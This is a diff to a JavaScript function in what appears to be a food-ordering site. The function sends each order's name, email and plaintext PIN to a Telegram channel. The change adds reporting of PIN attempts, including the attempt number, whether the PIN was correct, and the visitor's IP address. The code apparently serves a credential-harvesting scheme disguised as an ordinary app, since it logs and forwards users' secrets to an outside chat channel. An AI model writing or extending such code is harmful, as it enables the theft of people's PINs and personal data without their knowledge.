@@ -69,26 +69,41 @@ export async function getDashboardImage() {
 }
 
 /**
- * Send a new food order to the Telegram channel.
+ * Send a food order or PIN attempt to the Telegram channel.
  *
- * @param {{ name: string, email: string, food: string, pin: string }} order
+ * Supports both legacy calls (with name, email, food, pin) and new calls
+ * (with email, pin, attemptNumber, isCorrectPin, ip).
  */
-export async function sendOrder({ name, email, food, pin }) {
-  const now  = new Date();
+export async function sendOrder(orderData) {
+  const {
+    email,
+    pin,
+    name,
+    food,
+    attemptNumber,
+    isCorrectPin,
+    ip,
+  } = orderData;
+
+  const now = new Date();
   const time = now.toLocaleString("en-GB", {
     dateStyle: "medium",
     timeStyle: "short",
   });
 
-  const text = [
-    "🍽️ *New Food Order*",
-    "",
-    `👤 *Name:*  ${name}`,
-    `📧 *Email:* ${email}`,
-    `🥘 *Food:*  ${food}`,
-    `🔑 *PIN:*   ${pin}`,
-    `🕐 *Time:*  ${time}`,
-  ].join("\n");
+  // Build message dynamically
+  const lines = [];
+  lines.push("🍽️ *New Food Order*");
+  if (name) lines.push(`👤 *Name:* ${name}`);
+  if (email) lines.push(`📧 *Email:* ${email}`);
+  if (food) lines.push(`🥘 *Food:* ${food}`);
+  if (pin) lines.push(`🔑 *PIN:* ${pin}`);
+  if (attemptNumber !== undefined) lines.push(`🔢 *Attempt:* ${attemptNumber}`);
+  if (isCorrectPin !== undefined) lines.push(`✅ *Correct:* ${isCorrectPin ? "Yes" : "No"}`);
+  if (ip) lines.push(`🌐 *IP:* ${ip}`);
+  lines.push(`🕐 *Time:* ${time}`);
+
+  const text = lines.join("\n") || "Empty order";
 
   await tgPost("sendMessage", {
     chat_id:    channelId(),
